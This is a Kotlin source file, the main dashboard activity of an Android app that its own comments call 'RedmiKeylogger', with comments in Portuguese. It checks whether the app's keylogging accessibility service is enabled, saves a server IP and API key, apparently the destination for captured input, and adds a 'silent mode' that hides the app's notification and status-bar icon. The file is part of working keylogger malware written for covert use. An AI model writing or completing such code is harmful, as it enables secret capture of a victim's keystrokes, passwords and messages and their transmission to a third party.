package com.seuempresa.redmikeylg

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.view.inputmethod.InputMethodManager
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.seuempresa.redmikeylg.databinding.ActivityMainBinding

/**
 * MainActivity — Dashboard de controle do RedmiKeylogger.
 *
 * Responsabilidades:
 *  - Status em tempo real do AccessibilityService (via onResume)
 *  - Configuração de IP do servidor e API Key
 *  - Toggle de Modo Silencioso (oculta notificação/ícone da status bar)
 *  - Solicitação de permissão POST_NOTIFICATIONS (Android 13+)
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    // Launcher para pedir permissão de notificação no Android 13+
    private val notifPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (!granted) {
            // Se negada, desativa o Modo Silencioso pois não pode exibir
            // nem a notificação mínima requerida pelo canal silent
            binding.switchSilentMode.isChecked = false
            LogManager.setSilentMode(this, false)
            Toast.makeText(
                this,
                "Permissão de notificação necessária para o serviço funcionar.",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    // ── Ciclo de vida ─────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        loadSavedConfig()
        setupListeners()
    }

    override fun onResume() {
        super.onResume()
        updateServiceStatus()
        // Sincroniza o switch com o valor salvo (ex: após rotação de tela)
        binding.switchSilentMode.isChecked = LogManager.isSilentMode(this)
    }

    // ── Configuração ──────────────────────────────────────────────────────────

    private fun loadSavedConfig() {
        binding.etServerIp.setText(LogManager.getServerIp(this))
        binding.etApiKey.setText(LogManager.getApiKey(this))
        binding.switchSilentMode.isChecked = LogManager.isSilentMode(this)
    }

    private fun setupListeners() {

        // Botão: Abrir configurações de acessibilidade do sistema
        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        // Botão: Salvar IP + API Key
        binding.btnSaveConfig.setOnClickListener {
            val ip  = binding.etServerIp.text?.toString()?.trim() ?: ""
            val key = binding.etApiKey.text?.toString()?.trim() ?: ""

            if (ip.isEmpty()) {
                binding.tilServerIp.error = getString(R.string.config_invalid)
                return@setOnClickListener
            }

            binding.tilServerIp.error = null
            LogManager.saveConfig(this, ip, key)

            val imm = getSystemService(INPUT_METHOD_SERVICE) as InputMethodManager
            imm.hideSoftInputFromWindow(binding.root.windowToken, 0)
            Toast.makeText(this, getString(R.string.config_saved), Toast.LENGTH_SHORT).show()
        }

        // Toggle: Modo Silencioso
        binding.switchSilentMode.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                // Garante permissão de notificação antes de ativar
                ensureNotificationPermission {
                    LogManager.setSilentMode(this, true)
                    // O KeyLoggerService reage via OnSharedPreferenceChangeListener
                    Toast.makeText(
                        this,
                        getString(R.string.silent_mode_on),
                        Toast.LENGTH_SHORT
                    ).show()
                }
            } else {
                LogManager.setSilentMode(this, false)
                Toast.makeText(
                    this,
                    getString(R.string.silent_mode_off),
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    // ── Permissão de Notificação (Android 13+) ────────────────────────────────

    /**
     * Verifica e, se necessário, solicita POST_NOTIFICATIONS.
     * Executa [onGranted] imediatamente se a permissão já está concedida
     * ou se o Android < 13 (sem necessidade de permissão explícita).
     */
    private fun ensureNotificationPermission(onGranted: () -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            onGranted()
            return
        }
        if (ContextCompat.checkSelfPermission(
                this, Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            onGranted()
        } else {
            // Salva o callback para executar após o resultado do launcher
            pendingOnGranted = onGranted
            notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    private var pendingOnGranted: (() -> Unit)? = null

    // ── Status do Serviço ─────────────────────────────────────────────────────

    private fun updateServiceStatus() {
        val isActive = isAccessibilityServiceEnabled()
        binding.tvStatus.text = getString(
            if (isActive) R.string.status_active else R.string.status_inactive
        )
        binding.tvStatus.setTextColor(
            getColor(if (isActive) R.color.status_active else R.color.status_inactive)
        )
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val serviceName = "${packageName}/${KeyLoggerService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabledServices)
        while (splitter.hasNext()) {
            if (splitter.next().equals(serviceName, ignoreCase = true)) return true
        }
        return false
    }
}
